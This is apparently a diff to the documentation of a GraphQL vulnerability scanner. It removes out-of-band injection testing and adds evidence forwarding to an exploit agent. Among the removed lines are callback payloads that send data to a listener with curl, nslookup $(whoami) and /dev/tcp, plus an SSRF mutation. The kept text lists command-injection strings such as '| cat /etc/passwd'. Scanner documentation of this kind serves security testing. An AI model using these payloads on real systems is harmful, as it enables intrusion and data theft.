@@ -52,7 +52,7 @@ CLI (orchestrator)
 
 1. `fingerprint` — identify the engine
 2. `info` — check information disclosure
-3. `injection` — test for SQLi, command injection, OOB
+3. `injection` — test for SQLi and command injection
 4. `auth` — test authentication and authorization
 5. `dos` — test denial of service (reads baseline from modules 1–4)
 
@@ -85,8 +85,6 @@ The CLI is the main orchestrator. It parses arguments, builds shared infrastruct
 | `--test-cases` | `str` | Root directory for YAML test cases (default: bundled). |
 | `--include` | `str[]` | Only load these YAML files (basename). Extension optional. |
 | `--schema-file` | `str` | Path to a JSON introspection schema file. |
-| `--listener-ip` | `str` | IP for the local OOB callback listener. |
-| `--listener-port` | `int` | Port for the local OOB callback listener. |
 | `--ai` | `flag` | Enable AI-assisted analysis (local Qwen via Ollama). |
 | `--ai-url` | `str` | OpenAI-compatible base URL (default `http://localhost:11434/v1`). |
 | `--ai-model` | `str` | Qwen model/tag (default `qwen2.5-coder:7b`). |
@@ -101,7 +99,7 @@ The CLI is the main orchestrator. It parses arguments, builds shared infrastruct
 
 **`_load_schema(client, args)`** — Loads schema from `--schema-file` if provided (with an informational introspection probe), otherwise runs live introspection. Fails if neither method yields a schema.
 
-**`_run_module(module_name, client, args, logger, loader, baseline)`** — Instantiates a test module by name, copies the client state, applies module-specific configuration (credentials, OOB listener), runs the test, and collects findings.
+**`_run_module(module_name, client, args, logger, loader, baseline)`** — Instantiates a test module by name, copies the client state, applies module-specific configuration (credentials), runs the test, and collects findings.
 
 **`main()`** — Top-level async flow: parse args → validate → build infrastructure → load schema → run modules → optional AI analysis → print findings summary.
 
@@ -111,14 +109,13 @@ The CLI is the main orchestrator. It parses arguments, builds shared infrastruct
 # Basic scan (all modules except DoS)
 grapeql --api https://example.com/graphql
 
-# Specific modules with OOB listener
+# Specific modules
 grapeql --api http://localhost:5013/graphql \
-    --modules fingerprint injection \
-    --listener-ip 172.17.0.1 --listener-port 4444
+    --modules fingerprint injection
 
-# Only run DVGA-specific test cases
+# Only run specific injection test cases
 grapeql --api http://localhost:5013/graphql \
-    --modules injection --include dvga_oob
+    --modules injection --include sqli command
 
 # Full scan with local AI summary (Qwen via Ollama)
 grapeql --api https://example.com/graphql --ai
@@ -355,53 +352,25 @@ test_cases:
 **Inherits:** `VulnerabilityTester`  
 **MODULE_NAME:** `injection`
 
-Tests for SQL injection, command injection, and out-of-band (OOB) vulnerabilities. Payloads and detection indicators are loaded from YAML test cases.
+Tests for SQL injection and command injection vulnerabilities. Payloads and detection indicators are loaded from YAML test cases.
 
 ### How It Works
 
-The module operates in three phases:
+The module operates in two phases:
 
 1. **SQL injection** — Injects SQLi payloads into every `String`/`ID` argument and checks response text for database error indicators.
 2. **Command injection** — Same approach with OS command payloads (e.g. `; id`, `| cat /etc/passwd`) and system output indicators.
-3. **OOB injection** — Starts a local TCP listener, injects callback payloads (curl, wget, SSRF URLs), and detects vulnerabilities by receiving inbound connections.
 
 ### Payload Categories
 
-Test cases are loaded from `test_cases/injection/*.yaml` and categorised by the `oob: true` flag:
+Test cases are loaded from `test_cases/injection/*.yaml`:
 
-| Category | Detection Method | Flag |
-|---|---|---|
-| `_sqli_cases` | Response content matching against indicators | `oob` absent |
-| `_cmd_cases` | Response content matching against indicators | `oob` absent |
-| `_oob_cases` | TCP listener callback detection | `oob: true` |
+| Category | Detection Method |
+|---|---|
+| `_sqli_cases` | Response content matching against indicators |
+| `_cmd_cases` | Response content matching against indicators |
 
-### OOB Testing
-
-OOB testing is enabled when `--listener-ip` and `--listener-port` are provided. The flow:
-
-1. **Start listener** — Async TCP server on the configured address.
-2. **Phase 1: Raw queries** — Test cases with a `query` key are sent verbatim (with CALLBACK placeholder substitution). Used for multi-arg mutations like `importPaste(host, port, path, scheme)`.
-3. **Phase 2: Generic payloads** — Test cases with a `payload` key are injected into every String/ID argument across all queries and mutations.
-4. **Wait** — 10-second final wait for slow callbacks.
-5. **Collect** — Any TCP connection received = CRITICAL finding.
-
-### Placeholder System
-
-| Placeholder | Replaced With | Example |
-|---|---|---|
-| `CALLBACK` | `http://ip:port` | `curl CALLBACK/exfil` → `curl http://10.0.0.5:4444/exfil` |
-| `CALLBACK_HOST` | Listener IP only | `nslookup $(whoami).CALLBACK_HOST` |
-| `CALLBACK_PORT` | Listener port only | `/dev/tcp/CALLBACK_HOST/CALLBACK_PORT` |
-
-**Important:** Replacements are applied in order `CALLBACK_HOST` → `CALLBACK_PORT` → `CALLBACK` to prevent the shorter `CALLBACK` from clobbering the longer placeholders.
-
-### OOBListener & OOBConnection
-
-**`OOBListener`** — Async TCP server that records inbound connections. Sends `HTTP/1.1 200 OK` to prevent client hangs. Reads up to 4KB from each connection.
-
-**`OOBConnection`** — Dataclass recording: timestamp, remote IP/port, payload name, and first 500 bytes of received data.
-
-### YAML Format (Standard)
+### YAML Format
 
 ```yaml
 test_cases:
@@ -413,30 +382,9 @@ test_cases:
       - "PostgreSQL"
 ```
 
-### YAML Format (OOB — Generic)
-
-```yaml
-test_cases:
-  - name: oob_curl_http
-    oob: true
-    payload: "; curl CALLBACK/cmd-curl"
-```
-
-### YAML Format (OOB — Raw Query)
-
-```yaml
-test_cases:
-  - name: dvga_importpaste_ssrf_http
-    oob: true
-    query: 'mutation { importPaste(host: "CALLBACK_HOST", port: CALLBACK_PORT, path: "/ssrf", scheme: "http") { result } }'
-```
-
 ### Configuration
 
 ```python
-# Called by CLI when --listener-ip and --listener-port are set
-instance.set_listener("10.0.0.5", 4444)
-
 # Called by CLI when --username and --password are set
 instance.set_credentials("admin", "changeme")
 ```
@@ -653,8 +601,7 @@ test_cases/
 ├── injection/
 │   ├── sqli.yaml
 │   ├── command.yaml
-│   ├── oob.yaml
-│   └── dvga_oob.yaml
+│   └── nosql.yaml
 ├── info/
 │   └── checks.yaml
 ├── auth/
@@ -781,9 +728,10 @@ Dataclass representing a security finding.
 | `endpoint` | `str` | Target endpoint URL. |
 | `impact` | `str` (optional) | Impact description. |
 | `remediation` | `str` (optional) | Remediation guidance. |
+| `evidence` | `dict` (optional) | The concrete request that triggered the finding (`query`, `variables`, `payload`, `field`). Forwarded to the Exploit Agent so it can build a PoC from the real request. |
 | `timestamp` | `str` | Auto-generated timestamp. |
 
-**`to_dict()`** — Serialises to a dictionary (used by Reporter and AI Agent).
+**`to_dict()`** — Serialises to a dictionary (used by Reporter, AI Agent, and Exploit Agent).
 
 ---
 
@@ -810,7 +758,6 @@ test_cases:
 | Fingerprint | `engine_id`, `probes`, `cve`, `tech` | Engine identification |
 | Info | `method`, `send_as`, `query`, `detection` | Information disclosure checks |
 | Injection | `payload`, `indicators` | Standard injection |
-| Injection (OOB) | `oob: true`, `payload` or `query` | Out-of-band injection |
-| Injection (OOB) | `target_args` | Restrict injection to specific arg names |
+| Injection | `target_args` | Restrict injection to specific arg names |
 | Auth | `strategy`, `headers`, `query`, `id_range` | Auth bypass testing |
 | DoS | `generator`, `send_as`, config params | DoS attack generation |
